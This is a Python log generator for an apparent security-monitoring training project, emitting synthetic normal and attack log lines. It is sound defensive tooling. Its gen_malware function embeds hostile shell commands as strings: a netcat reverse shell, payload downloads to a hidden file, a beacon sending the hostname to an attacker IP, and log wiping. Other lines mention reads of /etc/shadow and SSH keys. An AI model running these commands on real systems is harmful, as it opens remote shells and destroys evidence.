"""
victim_app.py - Sample Victim Application
----------------------------------------------------------------------------
Simulates a real-world web/auth service that continuously writes logs
to a configurable directory. The SOC-in-a-Box system watches this directory.

Simulated services
------------------
  - Web server (HTTP requests, errors, slow responses)
  - Auth service (logins, failures, brute-force patterns)
  - Database layer (queries, SQL errors, connection drops)
  - System events (file access, privilege changes, cron jobs)
  - Attacker scenarios (brute-force, injection, exfil, shell commands)

Usage
-----
  python victim_app/victim_app.py                      # defaults
  python victim_app/victim_app.py --output ./logs      # custom output dir
  python victim_app/victim_app.py --rate 3             # 3 events/sec
  python victim_app/victim_app.py --attack-rate 0.3    # 30% malicious events
----------------------------------------------------------------------------
"""

import os
import sys
import time
import random
import argparse
import logging
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# Log line generators
# ---------------------------------------------------------------------------

NORMAL_IPS   = ["192.168.1.10", "192.168.1.22", "10.0.0.5", "172.16.0.8", "192.168.100.3"]
ATTACK_IPS   = ["185.220.101.47", "45.33.32.156", "198.51.100.23", "91.134.213.56", "103.21.244.0"]
VALID_USERS  = ["alice", "bob", "charlie", "dave", "svc_worker"]
ATTACK_USERS = ["admin", "root", "test", "guest", "administrator"]

HTTP_PATHS = [
    "/api/v1/users", "/api/v1/products", "/login", "/logout", "/dashboard",
    "/api/v1/orders", "/static/main.js", "/health", "/api/v1/profile",
]

SQL_TABLES = ["users", "sessions", "orders", "products", "audit_log"]


def _ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def gen_http_normal():
    ip     = random.choice(NORMAL_IPS)
    method = random.choice(["GET", "GET", "GET", "POST", "PUT"])
    path   = random.choice(HTTP_PATHS)
    code   = random.choices([200, 200, 200, 201, 304, 404], weights=[60, 15, 10, 5, 5, 5])[0]
    ms     = random.randint(12, 350)
    return f'{_ts()} INFO  [web-server] {ip} - - "{method} {path} HTTP/1.1" {code} {ms}ms'


def gen_http_slow():
    ip   = random.choice(NORMAL_IPS)
    path = random.choice(HTTP_PATHS)
    ms   = random.randint(3000, 12000)
    return f'{_ts()} WARNING  [web-server] Slow response {ip} "GET {path} HTTP/1.1" 200 {ms}ms - possible DoS'


def gen_auth_success():
    user = random.choice(VALID_USERS)
    ip   = random.choice(NORMAL_IPS)
    method = random.choice(["password", "publickey"])
    return f'{_ts()} INFO  [sshd] Accepted {method} for {user} from {ip} port {random.randint(40000, 65000)}'


def gen_auth_failure():
    user = random.choice(VALID_USERS + ATTACK_USERS)
    ip   = random.choice(ATTACK_IPS)
    return f'{_ts()} WARNING  [sshd] Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2'


def gen_brute_force():
    user = random.choice(ATTACK_USERS)
    ip   = random.choice(ATTACK_IPS)
    lines = []
    for _ in range(random.randint(8, 20)):
        lines.append(
            f'{_ts()} WARNING  [sshd] Failed password for invalid user {user} from {ip} port {random.randint(40000, 65000)} ssh2'
        )
    lines.append(f'{_ts()} ERROR   [sshd] POSSIBLE BREAK-IN ATTEMPT from {ip} for user {user}')
    return "\n".join(lines)


def gen_privilege_escalation():
    user = random.choice(VALID_USERS)
    ip   = random.choice(ATTACK_IPS)
    return (
        f'{_ts()} ERROR   [sudo] {user} : FAILED ; TTY=pts/0 ; PWD=/home/{user} ; '
        f'USER=root ; COMMAND=/bin/bash\n'
        f'{_ts()} CRITICAL [pam_unix] authentication failure; logname={user} uid=1001 '
        f'euid=0 tty=pts/0 rhost={ip} user=root'
    )


def gen_file_access():
    user = random.choice(ATTACK_USERS)
    ip   = random.choice(ATTACK_IPS)
    target = random.choice(["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa", "/var/log/auth.log"])
    return (
        f'{_ts()} CRITICAL [auditd] SYSCALL type=OPEN comm=cat '
        f'name={target} user={user} src={ip} - UNAUTHORIZED ACCESS'
    )


def gen_malware():
    ip   = random.choice(ATTACK_IPS)
    cmd  = random.choice([
        f"wget http://{ip}/payload.sh -O /tmp/.hidden",
        f"curl http://{ip}/c2/beacon -d host=$(hostname)",
        "base64 -d <<< SGVsbG8gV29ybGQ= | bash",
        "nc -e /bin/bash 185.220.101.47 4444",
        "chmod 777 /tmp/.hidden && /tmp/.hidden &",
        "rm -rf /var/log/* && history -c",
    ])
    return f'{_ts()} CRITICAL [process] Suspicious command detected: `{cmd}` by user root from {ip}'


def gen_sql_normal():
    tbl = random.choice(SQL_TABLES)
    ms  = random.randint(1, 50)
    return f'{_ts()} INFO  [db] Query OK SELECT * FROM {tbl} WHERE id=? [{ms}ms] rows=1'


def gen_sql_error():
    tbl = random.choice(SQL_TABLES)
    return (
        f'{_ts()} ERROR   [db] Query failed: You have an error in your SQL syntax near '
        f'"UNION SELECT * FROM {tbl}--" at line 1 - possible SQL injection'
    )


def gen_data_exfil():
    ip   = random.choice(ATTACK_IPS)
    size = random.randint(50, 500)
    return (
        f'{_ts()} CRITICAL [network] Unusual outbound transfer: {size}MB to {ip}:443 '
        f'from internal DB server - potential DATA EXFILTRATION'
    )


def gen_service_crash():
    svc = random.choice(["nginx", "postgres", "redis", "app-worker", "auth-service"])
    return (
        f'{_ts()} ERROR   [systemd] Service {svc}.service: Main process exited, '
        f'code=killed status=9/KILL\n'
        f'{_ts()} ERROR   [systemd] {svc}.service: Failed with result signal.'
    )


def gen_log_tampering():
    user = random.choice(ATTACK_USERS)
    return (
        f'{_ts()} CRITICAL [auditd] Log file modified: /var/log/auth.log '
        f'by user={user} - POSSIBLE LOG TAMPERING'
    )


# ---------------------------------------------------------------------------
# Event registry
# ---------------------------------------------------------------------------

NORMAL_EVENTS = [
    (gen_http_normal,    50),
    (gen_auth_success,   20),
    (gen_sql_normal,     20),
    (gen_http_slow,       5),
    (gen_service_crash,   5),
]

ATTACK_EVENTS = [
    (gen_auth_failure,        25),
    (gen_brute_force,         20),
    (gen_privilege_escalation, 15),
    (gen_file_access,         10),
    (gen_malware,             10),
    (gen_sql_error,           10),
    (gen_data_exfil,           5),
    (gen_log_tampering,        5),
]


def weighted_choice(events):
    fns, weights = zip(*events)
    return random.choices(fns, weights=weights, k=1)[0]


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def run(output_dir: str, rate: float, attack_rate: float):
    log_dir = Path(output_dir)
    log_dir.mkdir(parents=True, exist_ok=True)
    log_file = log_dir / "app.log"

    print(f"""
╔══════════════════════════════════════════════════════╗
║          SOC-in-a-Box  ·  Victim App                ║
╠══════════════════════════════════════════════════════╣
║  Output  : {str(log_file):<42}║
║  Rate    : {rate} events/sec{' ' * (41 - len(f'{rate} events/sec'))}║
║  Attack% : {int(attack_rate * 100)}%{' ' * (43 - len(f'{int(attack_rate * 100)}%'))}║
║  Press Ctrl+C to stop                               ║
╚══════════════════════════════════════════════════════╝
""")

    event_count  = 0
    attack_count = 0
    start_time   = time.time()

    try:
        while True:
            is_attack = random.random() < attack_rate

            if is_attack:
                fn = weighted_choice(ATTACK_EVENTS)
                attack_count += 1
            else:
                fn = weighted_choice(NORMAL_EVENTS)

            line = fn()
            event_count += 1

            with open(log_file, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
                fh.flush()

            # Console summary
            elapsed = int(time.time() - start_time)
            tag = "🔴 ATTACK" if is_attack else "🟢 NORMAL"
            print(f"[{elapsed:>5}s] {tag}  #{event_count:>5}  | {line[:80]}", flush=True)

            time.sleep(1.0 / rate)

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[Victim App] Stopped. {event_count} events in {elapsed:.1f}s "
              f"({attack_count} attacks = {100*attack_count/max(event_count,1):.1f}%)")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC-in-a-Box Victim App — Log Generator")
    parser.add_argument("--output",      default="./victim_app/logs", help="Output directory for log files")
    parser.add_argument("--rate",        type=float, default=1.0,     help="Log events per second (default: 1.0)")
    parser.add_argument("--attack-rate", type=float, default=0.25,    help="Fraction of events that are attacks (0.0–1.0, default: 0.25)")
    args = parser.parse_args()

    run(
        output_dir  = args.output,
        rate        = max(0.1, args.rate),
        attack_rate = max(0.0, min(1.0, args.attack_rate)),
    )
